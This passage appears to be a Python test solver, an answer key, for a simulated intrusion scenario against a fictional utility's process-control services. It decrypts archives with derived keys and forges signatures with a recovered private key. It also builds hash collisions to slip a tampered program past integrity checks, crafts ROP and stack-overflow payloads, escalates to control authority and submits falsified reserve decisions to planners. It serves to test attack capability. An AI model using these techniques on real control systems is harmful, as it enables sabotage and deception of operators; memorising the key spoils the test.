                part, content_type = get_bytes(f"{base}/api/artifacts/collector/part-{index:02d}")
                self.assertEqual(content_type, "application/octet-stream")
                self.assertEqual(hashlib.sha256(part).hexdigest(), expected["sha256"])
                fragments.append(part)
            artifact = b"".join(fragments)
            self.assertEqual(hashlib.sha256(artifact).hexdigest(), collector["collector_sha256"])
            write_bytes("/var/lib/fieldlink-connector/retained-artifact", artifact, mode="0700")
            described = inside("/var/lib/fieldlink-connector/retained-artifact", "describe")
            self.assertEqual(described.returncode, 0, described.stderr)
            description = json.loads(described.stdout)
            self.assertEqual(description["build_id"], collector["build_id"])
            status, response = request(self.discovered_route("archive.handover-collector"), method="POST",
                                        body={"build_id": description["build_id"], "collector_sha256": hashlib.sha256(artifact).hexdigest()},
                                        expected=201)
            self.assertEqual(response["record"]["language"], "Go 1.22")

        with self.subTest(card="W08.4 where the contractor put it"):
            collector = self.evidence["w08_collector"]
            # The collection ID's non-revision prefix is the config's HKDF salt;
            # the recovered build ID is its input key material.
            salt = self.evidence["w08_collection_id"].rsplit("-", 1)[0]
            envelope_bytes, _ = get_bytes(f"{base}/api/artifacts/collector/config")
            envelope = json.loads(envelope_bytes)
            script = (
                "import base64, json, sys\n"
                "from cryptography.hazmat.primitives import hashes\n"
                "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
                "from cryptography.hazmat.primitives.kdf.hkdf import HKDF\n"
                "value = json.loads(base64.b64decode(sys.argv[1]))\n"
                f"key = HKDF(algorithm=hashes.SHA256(), length=32, salt={salt.encode()!r}, info=b'collector-config/v3').derive({collector['build_id']!r}.encode())\n"
                "print(AESGCM(key).decrypt(base64.b64decode(value['nonce']), base64.b64decode(value['ciphertext_and_tag']), value['aad'].encode()).decode(), end='')\n"
            )
            decrypted = inside("python3", "-c", script, base64.b64encode(json.dumps(envelope).encode()).decode())
            self.assertEqual(decrypted.returncode, 0, decrypted.stderr)
            status, _ = request(self.discovered_route("contractors.artifact"), method="POST", body={"plaintext": "wrong"})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("contractors.artifact"), method="POST", body={"plaintext": decrypted.stdout}, expected=201)
            self.assertEqual(response["record"]["identity"], "svc-field-collection")
            self.evidence["w08_archive"] = response["record"]["archive"]

    # ------------------------------------------------------------------ W12
    def test_w12_cold_archive(self) -> None:
        base = self.host("retained_archive")

        with self.subTest(card="W12.1 a collector in quarantine"):
            status, response = request(self.discovered_route("archive.quarantine-collector"), expected=200)
            record = response["record"]
            self.evidence["w12_object"] = record["record_id"]
            self.evidence["w12_archive_id"] = record["archive"]
            self.evidence["w12_build_id"] = record["collector_build_id"]
            self.assertEqual(record["format"], "AQTN1")
            self.assertEqual(record["digest"], "SHA-256")
            self.assertNotEqual(record["record_id"], record["archive"])

        with self.subTest(card="W12.2 how the collection was protected"):
            frame, content_type = get_bytes(f"{base}/api/artifacts/{self.evidence['w12_object']}.aqtn")
            self.assertEqual(content_type, "application/octet-stream")
            self.assertEqual(frame[:5], b"AQTN1")
            metadata_length = int.from_bytes(frame[5:9], "big")
            build_length = int.from_bytes(frame[49:51], "big")
            build = frame[51:51 + build_length]
            self.assertEqual(build.decode(), self.evidence["w12_build_id"])
            nonce_start = 51 + build_length
            nonce = frame[nonce_start:nonce_start + 12]
            metadata_start = nonce_start + 12
            metadata = frame[metadata_start:metadata_start + metadata_length]
            ciphertext = frame[metadata_start + metadata_length:]
            self.evidence["w12_frame"] = {"metadata": metadata, "nonce": nonce, "ciphertext": ciphertext}

            samples_bytes, _ = get_bytes(f"{base}/api/artifacts/AQTN1-samples.json")
            # The quarantine record's archive id is the KDF salt; its build id is
            # the input key material (the same relationship the frame itself uses).
            script = (
                "import base64, hashlib, json, sys\n"
                "from cryptography.exceptions import InvalidTag\n"
                "from cryptography.hazmat.primitives import hashes\n"
                "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
                "from cryptography.hazmat.primitives.keywrap import aes_key_unwrap\n"
                "from cryptography.hazmat.primitives.kdf.hkdf import HKDF\n"
                "samples = json.loads(base64.b64decode(sys.argv[1]))['samples']\n"
                f"keys = HKDF(algorithm=hashes.SHA256(), length=64, salt={self.evidence['w12_archive_id'].encode()!r}, info=b'aqtn1/keys').derive({self.evidence['w12_build_id'].encode()!r})\n"
                "out = {}\n"
                "for s in samples:\n"
                "    if s['operation'] == 'AES-256-GCM decrypt':\n"
                "        value = AESGCM(keys[:32]).decrypt(base64.b64decode(s['nonce']), base64.b64decode(s['ciphertext_and_tag']), base64.b64decode(s['aad']))\n"
                "        out[s['sample_id']] = hashlib.sha256(value).hexdigest()\n"
                "    elif s['operation'] == 'AES-256-KW unwrap':\n"
                "        value = aes_key_unwrap(keys[32:], base64.b64decode(s['wrapped']))\n"
                "        out[s['sample_id']] = hashlib.sha256(value).hexdigest()\n"
                "    else:\n"
                "        try:\n"
                "            AESGCM(keys[:32]).decrypt(base64.b64decode(s['nonce']), base64.b64decode(s['ciphertext_and_tag']), base64.b64decode(s['aad']))\n"
                "        except InvalidTag:\n"
                "            out[s['sample_id']] = 'authentication_failed'\n"
                "print(json.dumps(out, sort_keys=True, separators=(',', ':')))\n"
            )
            computed = inside("python3", "-c", script, base64.b64encode(samples_bytes).decode())
            self.assertEqual(computed.returncode, 0, computed.stderr)
            results = json.loads(computed.stdout)
            status, _ = request(self.discovered_route("archive.bundle-collection-policy"), method="POST",
                                 body={"sample_results": dict(results, **{next(iter(results)): "wrong"})})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("archive.bundle-collection-policy"), method="POST",
                                        body={"sample_results": results}, expected=201)
            self.assertEqual(response["record"]["key_cipher"], "AES-256-KW")

        with self.subTest(card="W12.3 the cold archive opens"):
            frame = self.evidence["w12_frame"]
            script = (
                "import base64, json, sys\n"
                "from cryptography.hazmat.primitives import hashes\n"
                "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
                "from cryptography.hazmat.primitives.keywrap import aes_key_unwrap\n"
                "from cryptography.hazmat.primitives.kdf.hkdf import HKDF\n"
                "metadata, nonce, ciphertext = map(base64.b64decode, sys.argv[1:4])\n"
                f"keys = HKDF(algorithm=hashes.SHA256(), length=64, salt={self.evidence['w12_archive_id'].encode()!r}, info=b'aqtn1/keys').derive({self.evidence['w12_build_id'].encode()!r})\n"
                "plaintext = AESGCM(keys[:32]).decrypt(nonce, ciphertext, metadata)\n"
                "collection = json.loads(plaintext)\n"
                "pkcs8 = aes_key_unwrap(keys[32:], base64.b64decode(collection['wrapped_pkcs8']))\n"
                "print(json.dumps({'plaintext': base64.b64encode(plaintext).decode(), 'pkcs8': base64.b64encode(pkcs8).decode()}, separators=(',', ':')))\n"
            )
            opened = inside("python3", "-c", script,
                             base64.b64encode(frame["metadata"]).decode(), base64.b64encode(frame["nonce"]).decode(), base64.b64encode(frame["ciphertext"]).decode())
            self.assertEqual(opened.returncode, 0, opened.stderr)
            values = json.loads(opened.stdout)
            key_bytes = base64.b64decode(values["pkcs8"])
            status, _ = request(self.discovered_route("archive.cold-archive-job"), method="POST",
                                 body={"plaintext": values["plaintext"], "unwrapped_pkcs8": base64.b64encode(bytes(len(key_bytes))).decode()})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("archive.cold-archive-job"), method="POST",
                                        body={"plaintext": values["plaintext"], "unwrapped_pkcs8": values["pkcs8"]}, expected=201)
            self.assertEqual(response["record"]["maintenance_record_count"], 37)
            self.evidence["w12_collection"] = response["collection"]
            self.evidence["w12_historical_key"] = values["pkcs8"]

        with self.subTest(card="W12.4 a collection path still alive"):
            collection = self.evidence["w12_collection"]
            nonce_value = "journey-request-001"
            script = (
                "import base64, sys\n"
                "from cryptography.hazmat.primitives.serialization import load_der_private_key\n"
                "key = load_der_private_key(base64.b64decode(sys.argv[1]), password=None)\n"
                "message = ('collect-archive/v3|CUR-COL-CRR-R11|R11|' + sys.argv[2]).encode()\n"
                "print(base64.b64encode(key.sign(message)).decode())\n"
            )
            signed = inside("python3", "-c", script, self.evidence["w12_historical_key"], nonce_value)
            self.assertEqual(signed.returncode, 0, signed.stderr)
            body = {
                "operation": "exchange", "certificate": collection["retired_client_certificate"],
                "rollover": collection["rollover"], "nonce": nonce_value, "proof": signed.stdout.strip(),
            }
            status, _ = request(self.discovered_route("archive.collection-path"), method="POST",
                                 body=dict(body, proof=base64.b64encode(b"wrong").decode()))
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("archive.collection-path"), method="POST", body=body, expected=201)
            self.assertEqual(response["record"]["scope"], "CUR-COL-CRR-R11/read")
            session = response["collection_session"]
            status, _ = request(self.discovered_route("archive.collection-path"), method="POST", body=body)
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("archive.collection-path"), method="POST",
                                        body={"operation": "read", "collection_session": session, "dataset": "CUR-COL-CRR-R11", "revision": 11},
                                        expected=201)
            self.assertTrue(response["record"]["current"])

    # ------------------------------------------------------------------ W26
    def test_w26_control_authority(self) -> None:
        import datetime as dt
        contractor = self.evidence["contractor_session"]
        approval = self.evidence["w15_approval"]
        # The approval record itself names the renderer that holds it.
        renderer_base = approval["renderer"]
        site_code = self.evidence["asset_bundle"]["asset"].split("-")[1]
        inspection = self.evidence["inspection"]

        with self.subTest(card="W26.1 which renderer holds the approval"):
            status, _ = request(self.discovered_route("maintenance.renderer"), token="wrong")
            self.assertEqual(status, 403)
            status, result = request(self.discovered_route("maintenance.renderer"), token=contractor, expected=200)
            self.assertEqual(result["record"]["approval"], approval["record_id"])

        with self.subTest(card="W26.2 authority behind the preview"):
            work_package = f"WP-{site_code}-CINDER-R1"
            body = {"work_package": work_package, "inspection": inspection, "preview": "privileged-inspection",
                    "caller_role": "contractor", "approval": approval}
            wrong = json.loads(json.dumps(body)); wrong["approval"]["revision"] = 5
            status, _ = request(self.discovered_route("maintenance.preview-authority"), method="POST", token=contractor, body=wrong)
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("maintenance.preview-authority"), method="POST", token=contractor, body=body, expected=201)
            self.assertEqual(result["record"]["work_package"], work_package)
            self.evidence["w26_work_package"] = work_package

        with self.subTest(card="W26.3 the preview executes"):
            body = {"work_package": self.evidence["w26_work_package"], "approval": approval["record_id"],
                    "action": "fetch_handover", "argument": "HND-MAINT-CTRL-09"}
            status, _ = request(self.discovered_route("maintenance.preview-execute"), method="POST", token=contractor, body={**body, "command": "id"})
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("maintenance.preview-execute"), method="POST", token=contractor, body=body, expected=201)
            self.assertEqual(result["handover"]["record_id"], "HND-MAINT-CTRL-09")
            broker_host = result["handover"]["audience"]
            self.evidence["w26_attestation"] = result["renderer_attestation"]
            self.evidence["w26_broker"] = f"https://{broker_host}"

        with self.subTest(card="W26.4 an approval becomes a control client"):
            broker = self.evidence["w26_broker"]
            body = {"renderer_attestation": self.evidence["w26_attestation"], "approval": approval,
                    "initiating_role": "contractor", "outlet_group": self.evidence["outlet_group"],
                    "project": self.evidence["legacy_project"], "actions": ["readback", "plan-execute"]}
            status, _ = request(self.discovered_route("process.approval-client"), method="POST", token=contractor, body={**body, "renderer_attestation": "wrong"})
            self.assertEqual(status, 403)
            status, result = request(self.discovered_route("process.approval-client"), method="POST", token=contractor, body=body, expected=201)
            record = result["record"]
            issued = dt.datetime.fromisoformat(record["issued_at"].replace("Z", "+00:00"))
            expires = dt.datetime.fromisoformat(record["expires_at"].replace("Z", "+00:00"))
            self.assertEqual((expires - issued).total_seconds(), 172800)
            self.evidence["w26_control_client"] = result["control_client"]
            self.evidence["w26_broker_record_id"] = record["record_id"]
            # Confirm the issued client actually carries its granted authority.
            correct = {"operation": "readback", "outlet_group": self.evidence["outlet_group"],
                       "project": self.evidence["legacy_project"], "action": "readback"}
            status, readback = request(self.discovered_route("process.approval-client"), method="POST",
                                        token=self.evidence["w26_control_client"], body=correct, expected=201)
            self.assertEqual(readback["record"]["authority"], "accepted")

    # ------------------------------------------------------------------ W27
    def test_w27_integrity_collision(self) -> None:
        base = self.evidence["process_view"]
        session = self.evidence["process_session"]
        # VER-ROT128-R3 / DPG-CONTRACT-R8 are the operation's documented, fixed
        # format identifiers (the DPG1 program format's own naming convention).
        integrity_id = "VER-ROT128-R3"

        with self.subTest(card="W27.1 what counts as intact"):
            status, missing = request(
                f"{base}/api/integrity-verifier", method="POST", token=session,
                body={"operation": "materials", "record_id": integrity_id},
            )
            self.assertEqual(status, 404)
            self.assertNotIn("verifier_b64", missing)
            status, _ = request(self.discovered_route("process.signature-program-reproduction"), method="POST", token="wrong",
                                 body={"operation": "materials", "record_id": integrity_id})
            self.assertEqual(status, 403)
            status, result = request(self.discovered_route("process.signature-program-reproduction"), method="POST", token=session,
                                      body={"operation": "materials", "record_id": integrity_id}, expected=201)
            record = result["record"]
            verifier = base64.b64decode(result["verifier_b64"])
            self.assertEqual(hashlib.sha256(verifier).hexdigest(), record["verifier_sha256"])
            write_bytes("/var/lib/fieldlink-connector/rot128-verifier", verifier, mode="0700")
            reproduced = []
            for item in result["programs"]:
                data = base64.b64decode(item["program_b64"])
                write_bytes(f"/var/lib/fieldlink-connector/{item['filename']}", data, mode="0600")
                completed = inside("/var/lib/fieldlink-connector/rot128-verifier", f"/var/lib/fieldlink-connector/{item['filename']}")
                self.assertEqual(completed.returncode, 0, completed.stderr)
                native = json.loads(completed.stdout)
                self.assertEqual(native["digest"], f"{w27_rot128(data):032x}")
                reproduced.append({"case_id": item["case_id"], "digest": native["digest"], "decision": native["decision"]})
            self.evidence["w27_results"] = reproduced

        with self.subTest(card="W27.2 the constraints of a valid-looking program"):
            results = self.evidence["w27_results"]
            status, _ = request(self.discovered_route("process.signature-program-reproduction"), method="POST", token=session,
                                 body={"operation": "results", "record_id": integrity_id, "program_set": "DPG1-CASES-R3",
                                       "results": [dict(results[0], decision="rejected"), *results[1:]]})
            self.assertEqual(status, 409)
            status, accepted = request(self.discovered_route("process.signature-program-reproduction"), method="POST", token=session,
                                        body={"operation": "results", "record_id": integrity_id, "program_set": "DPG1-CASES-R3", "results": list(reversed(results))}, expected=201)
            self.assertEqual(accepted["record"]["cases_verified"], len(results))
            status, missing = request(
                f"{base}/api/integrity-verifier", method="POST", token=session,
                body={"operation": "materials", "record_id": integrity_id},
            )
            self.assertEqual(status, 404)
            self.assertNotIn("verifier_b64", missing)
            status, contract = request(self.discovered_route("process.signature-program-constraints"), method="POST", token=session,
                                        body={"operation": "contract", "record_id": "DPG-CONTRACT-R8"}, expected=201)
            record = contract["record"]
            program_base = base64.b64decode(contract["base_program_b64"])
            for case in record["distinguishing_cases"]:
                changed = bytearray(program_base); bit = case["bit"]
                changed[bit // 8] ^= 1 << (bit % 8)
                self.assertEqual(case["delta"], f"{w27_rot128(bytes(changed)) ^ w27_rot128(program_base):032x}")
            identical = {"operation": "model", "record_id": "DPG-MODEL-R8", "cases": record["distinguishing_cases"],
                         "program_b64": base64.b64encode(program_base).decode()}
            status, _ = request(self.discovered_route("process.signature-program-constraints"), method="POST", token=session, body=identical)
            self.assertEqual(status, 409)
            seed = bytearray(program_base); seed[48:64] = b"DPG-CRR-MODEL1".ljust(16, b"\0")
            candidate = w27_solve_collision(bytes(seed), program_base, record["reservoir_bits"])
            status, modeled = request(self.discovered_route("process.signature-program-constraints"), method="POST", token=session,
                                       body={**identical, "program_b64": base64.b64encode(candidate).decode()}, expected=201)
            self.assertTrue(modeled["record"]["nonidentical"])
            self.evidence["w27_contract"] = record
            self.evidence["w27_base_program"] = program_base

        with self.subTest(card="W27.3 a program the engineer would accept"):
            program_base = self.evidence["w27_base_program"]
            reservoir_bits = self.evidence["w27_contract"]["reservoir_bits"]
            seed = bytearray(program_base); seed[48:64] = b"DPG-CRR-CINDER".ljust(16, b"\0")
            struct.pack_into("<f", seed, 284, self.evidence["reported_ml"])
            candidate = w27_solve_collision(bytes(seed), program_base, reservoir_bits)
            malformed = bytearray(candidate); malformed[64] ^= 1
            status, _ = request(self.discovered_route("process.diagnostic-run"), method="POST", token=session,
                                 body={"record_id": "DPG-CRR-CINDER", "consumer": "PLAN-CONSUMER-R8", "program_b64": base64.b64encode(malformed).decode()})
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("process.diagnostic-run"), method="POST", token=session,
                                      body={"record_id": "DPG-CRR-CINDER", "consumer": "PLAN-CONSUMER-R8", "program_b64": base64.b64encode(candidate).decode()}, expected=201)
            accepted = result["record"]
            self.assertEqual(accepted["estimate"]["Cairn Reach"], self.evidence["reported_ml"])
            self.assertFalse(accepted["raw_process_observations_changed"])
            self.evidence["w27_dpg_record"] = accepted["program_id"]
            self.evidence["w27_consumer"] = accepted["consumer"]
            self.evidence["w27_estimate"] = accepted["estimate"]

    # ------------------------------------------------------------------ W28
    def test_w28_utility_privilege_escalation(self) -> None:
        base = self.evidence["process_view"]
        session = self.evidence["process_session"]

        def frame(relationship: dict, pie_base: int, canary: int, issue: bool) -> bytes:
            offsets = relationship["elf_offsets"]
            layout = relationship["frame"]
            result = bytearray(b"A" * layout["payload_bytes"] + b"\0" * layout["alignment_bytes"])
            result += struct.pack("<Q", canary)
            result += struct.pack("<Q", pie_base + layout["chain_offset"])
            result += struct.pack("<Q", pie_base + offsets["stack_pivot"])
            if not issue:
                result += struct.pack("<QQ", pie_base + offsets["pop_rdi"], pie_base + offsets["controlled_target"])
                return bytes(result)
            vdso = int(relationship["fixed_vdso"]["base"], 16)
            chain = [
                pie_base + offsets["pop_rdi"], 0,
                pie_base + offsets["pop_rsi"], 0,
                pie_base + offsets["pop_rdx"], 0,
                vdso + relationship["fixed_vdso"]["setresuid_syscall_offset"],
                pie_base + offsets["pop_rdi"], pie_base + offsets["issuer_record"],
                pie_base + offsets["pop_rsi"], pie_base + offsets["request_correlation"],
                pie_base + offsets["issue_client"],
            ]
            result += b"".join(struct.pack("<Q", value) for value in chain)
            return bytes(result)

        with self.subTest(card="W28.1 the utility's small world"):
            status, _ = request(self.discovered_route("process.collision-inputs"), method="POST", token="wrong",
                                 body={"operation": "materials", "project_revision": 364})
            self.assertEqual(status, 403)
            status, result = request(self.discovered_route("process.collision-inputs"), method="POST", token=session,
                                      body={"operation": "materials", "project_revision": 364}, expected=201)
            record = result["record"]
            binary = base64.b64decode(result["utility_b64"])
            self.assertEqual(binary[:4], b"\x7fELF")
            self.assertEqual(hashlib.sha256(binary).hexdigest(), record["utility_sha256"])
            signed = record["status"]
            self.evidence["utility_session_id"] = signed["session_id"]
            self.evidence["w28_relationship"] = result["relationship"]
            self.evidence["w28_canary"] = int(signed["stack_canary"], 16)
            self.evidence["w28_pie_base"] = int(signed["return_address"], 16) - signed["status_return_offset"]

        with self.subTest(card="W28.2 control with very little room"):
            relationship = self.evidence["w28_relationship"]
            crafted = frame(relationship, self.evidence["w28_pie_base"], self.evidence["w28_canary"], issue=False)
            body = {"session_id": self.evidence["utility_session_id"], "length": len(crafted), "frame_b64": base64.b64encode(crafted).decode()}
            wrong = bytearray(crafted); wrong[200] ^= 1
            status, _ = request(self.discovered_route("process.release-confirmation"), method="POST", token=session, body={**body, "frame_b64": base64.b64encode(wrong).decode()})
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("process.release-confirmation"), method="POST", token=session, body=body, expected=201)
            self.assertTrue(result["record"]["canary_preserved"])
            self.assertTrue(result["record"]["controlled_flow"])

        with self.subTest(card="W28.3 keep the authority you earned"):
            relationship = self.evidence["w28_relationship"]
            crafted = frame(relationship, self.evidence["w28_pie_base"], self.evidence["w28_canary"], issue=True)
            body = {"operation": "issue", "session_id": self.evidence["utility_session_id"],
                    "length": len(crafted), "frame_b64": base64.b64encode(crafted).decode()}
            wrong = bytearray(crafted); wrong[-8:] = struct.pack("<Q", self.evidence["w28_pie_base"] + 1)
            status, _ = request(self.discovered_route("process.control-authority"), method="POST", token=session, body={**body, "frame_b64": base64.b64encode(wrong).decode()})
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("process.control-authority"), method="POST", token=session, body=body, expected=201)
            record = result["record"]
            self.assertEqual(record["outlet_group"], self.evidence["outlet_group"])
            self.assertEqual(record["project"], self.evidence["legacy_project"])
            self.evidence["w28_control_client"] = result["control_client"]
            # The issued client's authority is genuinely scoped and usable.
            readback = {"operation": "readback", "control_client": self.evidence["w28_control_client"],
                        "outlet_group": self.evidence["outlet_group"], "project": self.evidence["legacy_project"], "action": "readback"}
            status, _ = request(self.discovered_route("process.control-authority"), method="POST", token=session, body={**readback, "action": "release"})
            self.assertEqual(status, 409)
            status, confirmed = request(self.discovered_route("process.control-authority"), method="POST", token=session, body=readback, expected=201)
            self.assertEqual(confirmed["record"]["authority"], "accepted")

    # ------------------------------------------------------------------ W31
    def test_w31_diagnostic_vault(self) -> None:
        process = self.evidence["process_view"]
        session = self.evidence["process_session"]
        case_id = f"DV-{self.evidence['work_order'].removeprefix('WO-')}"

        with self.subTest(card="W31.1 the vault's misleading length"):
            status, _ = request(self.discovered_route("process.vault-record"), token="wrong")
            self.assertEqual(status, 403)
            status, result = request(self.discovered_route("process.vault-record"), token=session, expected=200)
            record = result["record"]
            worker = base64.b64decode(result["worker_b64"], validate=True)
            self.assertEqual(worker[:4], b"\x7fELF")
            self.assertEqual(hashlib.sha256(worker).hexdigest(), record["worker"]["sha256"])
            self.assertEqual(w31_elf_posture(worker), (True, True, True))
            build_id = f"DVL-WORKER-{record['record_id'].rsplit('-', 1)[-1]}"
            self.evidence["w31_contract"] = record
            self.evidence["w31_worker"] = worker
            self.evidence["w31_case_id"] = case_id
            self.evidence["w31_build_id"] = build_id

        with self.subTest(card="W31.2 past the parser's boundary"):
            payload = b"B" * 500
            wrapped = w31_dvl1(payload)
            body = {"case_id": case_id, "build_id": self.evidence["w31_build_id"], "record_b64": base64.b64encode(wrapped).decode()}
            wrong_crc = bytearray(wrapped); wrong_crc[8] ^= 1
            status, _ = request(self.discovered_route("process.signature-record"), method="POST", token=session, body={**body, "record_b64": base64.b64encode(wrong_crc).decode()})
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("process.signature-record"), method="POST", token=session, body=body, expected=201)
            self.assertTrue(result["record"]["worker_exited_normally"])

        with self.subTest(card="W31.3 the state execution returns to"):
            contract = self.evidence["w31_contract"]
            worker = self.evidence["w31_worker"]
            process_status = contract["status"]; layout = contract["frame"]
            base = int(process_status["status_address"], 16) - process_status["status_offset"]
            export = base + w31_elf_symbol(worker, "export_history")
            history_reference = contract["protected_history_reference"].encode() + b"\0"
            history = base + w31_elf_string_vaddr(worker, history_reference)

            def exploit_record(*, canary_delta: int = 0, return_delta: int = 0) -> bytes:
                payload = bytearray(b"A" * 500)
                struct.pack_into("<Q", payload, layout["canary_offset"], int(process_status["stack_canary"], 16) ^ canary_delta)
                struct.pack_into("<Q", payload, layout["saved_rbp_offset"], base + 0x18000)
                struct.pack_into("<Q", payload, layout["return_state_offset"], export + return_delta)
                struct.pack_into("<Q", payload, layout["argument_offset"], history)
                return w31_dvl1(bytes(payload))

            common = {"case_id": case_id, "build_id": self.evidence["w31_build_id"]}
            status, _ = request(self.discovered_route("process.replay-divergence"), method="POST", token=session,
                                 body={**common, "record_b64": base64.b64encode(exploit_record(canary_delta=1)).decode()})
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("process.replay-divergence"), method="POST", token=session,
                                      body={**common, "record_b64": base64.b64encode(exploit_record()).decode()}, expected=201)
            record = result["record"]
            self.assertTrue(record["canary_preserved"])
            self.assertTrue(record["worker_exited_normally"])
            self.evidence["w31_execution"] = record

        with self.subTest(card="W31.4 the diagnostic service's authority"):
            execution = self.evidence["w31_execution"]
            body = {key: execution[key] for key in ("execution_id", "correlation", "history_id", "history_digest")}
            status, _ = request(self.discovered_route("process.diagnostic-authority"), method="POST", token=session, body={**body, "history_id": "wrong"})
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("process.diagnostic-authority"), method="POST", token=session, body=body, expected=201)
            self.assertEqual(result["history"]["record_id"], execution["history_id"])
            self.assertFalse(result["record"]["current_approval"])
            self.assertFalse(result["record"]["control_authority"])

    # ------------------------------------------------------------------ W32
    def test_w32_replay_divergence(self) -> None:
        process = self.evidence["process_view"]
        session = self.evidence["process_session"]

        with self.subTest(card="W32.1 the replay's pieces"):
            status, _ = request(self.discovered_route("process.replay-session"), token="wrong")
            self.assertEqual(status, 403)
            status, result = request(self.discovered_route("process.replay-session"), token=session, expected=200)
            record = result["record"]
            binary = base64.b64decode(result["replay_b64"], validate=True)
            self.assertEqual(binary[:4], b"\x7fELF")
            self.assertEqual(hashlib.sha256(binary).hexdigest(), record["sha256"])
            write_bytes("/var/lib/fieldlink-connector/replay-engine", binary, mode="0700")
            transitions = json.loads(inside("/var/lib/fieldlink-connector/replay-engine", "transitions").stdout)
            condition = json.loads(inside("/var/lib/fieldlink-connector/replay-engine", "condition").stdout)
            witness = json.loads(inside("/var/lib/fieldlink-connector/replay-engine", "witness").stdout)
            self.evidence["w32_contract"] = record
            self.evidence["w32_transitions"] = transitions
            self.evidence["w32_condition"] = condition
            self.evidence["w32_witness"] = witness

        with self.subTest(card="W32.2 the systems that update it"):
            record = self.evidence["w32_contract"]
            body = {"record_id": record["record_id"], "revision": record.get("revision", 19), "transitions": self.evidence["w32_transitions"]}
            wrong = json.loads(json.dumps(body)); wrong["transitions"][2]["reserve_ml"] = 13.4
            status, _ = request(self.discovered_route("process.estimator-inputs"), method="POST", token=session, body=wrong)
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("process.estimator-inputs"), method="POST", token=session, body=body, expected=201)
            self.assertEqual(result["record"]["cases_reproduced"], len(self.evidence["w32_transitions"]))

        with self.subTest(card="W32.3 the condition the old model used"):
            record = self.evidence["w32_contract"]
            body = {"replay": record["record_id"], "trace": record["trace_binding"], "condition": self.evidence["w32_condition"]}
            wrong = json.loads(json.dumps(body)); wrong["condition"]["read_binding"] = "wrong"
            status, _ = request(self.discovered_route("process.estimator-result"), method="POST", token=session, body=wrong)
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("process.estimator-result"), method="POST", token=session, body=body, expected=201)
            self.assertTrue(result["record"]["approved"])

        with self.subTest(card="W32.4 replay is not reality"):
            record = self.evidence["w32_contract"]
            body = {"replay": record["record_id"], "trace": record["trace_binding"], "witness": self.evidence["w32_witness"]}
            wrong = json.loads(json.dumps(body)); wrong["witness"]["current_model"]["post_update_reserve_ml"] = self.evidence["committed_ml"] + 0.4
            status, _ = request(self.discovered_route("process.replay-execute"), method="POST", token=session, body=wrong)
            self.assertEqual(status, 409)
            status, result = request(self.discovered_route("process.replay-execute"), method="POST", token=session, body=body, expected=201)
            record2 = result["record"]
            self.assertEqual(record2["retained_replay"]["decision"], "accepted")
            self.assertEqual(record2["current_model"]["decision"], "rejected")
            self.assertFalse(record2["live_authority"])

    # ------------------------------------------------------------------ W34
    def test_w34_reporting_checkpoint(self) -> None:
        planner = {"X-ARWC-Planner-Session": "@planner"}
        source = self.evidence["w27_dpg_record"]
        estimate = self.evidence["w27_estimate"]

        def plan(key: str, body: dict, token: str | None = None,
                 tenant: str = "arwc", expected: int | None = None) -> tuple[int, dict]:
            return request(self.discovered_route(key), method="POST", body=body, token=token,
                           tenant=tenant, headers=planner, expected=expected)

        _, contract = request(
            self.discovered_route("planning.reporting-contract"),
            headers=planner, expected=200,
        )

        with self.subTest(card="W34.1 which view the planner trusts"):
            view_values = {
                "checkpoint": contract["checkpoint"],
                "consumer": self.evidence["w27_consumer"],
                "consumer_revision": int(self.evidence["w27_consumer"].rsplit("R", 1)[1]),
                "source": source,
                "estimate": estimate,
                "refresh_interval_seconds": contract["view"]["refresh_interval_seconds"],
                "raw_observations": [
                    self.evidence["meter_record"], *sorted(self.evidence["instruments"]),
                ],
            }
            view = {key: view_values[key] for key in contract["view"]["required"]}
            status, _ = plan("planning.reporting-view", view, token="wrong")
            self.assertEqual(status, 403)
            status, _ = plan("planning.reporting-view", dict(view, consumer_revision=view["consumer_revision"] - 1))
            self.assertEqual(status, 409)
            status, result = plan("planning.reporting-view", view, expected=201)
            record = result["record"]
            self.assertEqual(record["source"], source)
            self.assertEqual(record["estimate"], estimate)
            self.assertFalse(record["raw_process_observations_changed"])
            status, repeated = plan("planning.reporting-view", view, expected=201)
            self.assertEqual(result, repeated)
            self.evidence["w34_view"] = record["record_id"]

        with self.subTest(card="W34.2 a reassuring decision"):
            decision_values = {
                "view": self.evidence["w34_view"],
                "checkpoint": contract["checkpoint"],
                "unit": contract["decision"]["unit"],
                "freshness_seconds": contract["decision"]["freshness_seconds"],
                "source_set": list(estimate),
                "unaffected": self.evidence["w23_analysis"]["unaffected"],
                "meter_reserve_ml": self.evidence["usable_reserve_ml"],
                "variance_limit_ml": contract["decision"]["variance_limit_ml"],
            }
            decision = {key: decision_values[key] for key in contract["decision"]["required"]}
            status, _ = plan("planning.planning-bid", dict(decision, unit="m3"))
            self.assertEqual(status, 409)
            status, result = plan("planning.planning-bid", decision, expected=201)
            record = result["record"]
            self.assertNotEqual(record["ordinary_decision"], record["decision"])
            self.assertTrue(record["decision_changed"])
            self.assertEqual(record["consistency"], "accepted")
            self.evidence["w34_decision"] = record["decision"]

        with self.subTest(card="W34.3 still reassuring after the handover"):
            handover_request = {
                "checkpoint": contract["checkpoint"], "view": self.evidence["w34_view"],
                "decision": self.evidence["w34_decision"],
                "control_client": self.evidence["w26_control_client"],
                "schedule": self.evidence["w33_schedule"],
                "handover": {"estimate_ml": self.evidence["reported_ml"],
                             "unit": contract["decision"]["unit"],
                             "status": contract["handover"]["status"],
                             "interval": self.evidence["planning_window"]},
            }
            status, _ = plan("planning.planning-handover", dict(handover_request, control_client="wrong"))
            self.assertEqual(status, 403)
            status, result = plan("planning.planning-handover", handover_request, expected=201)
            record = result["record"]
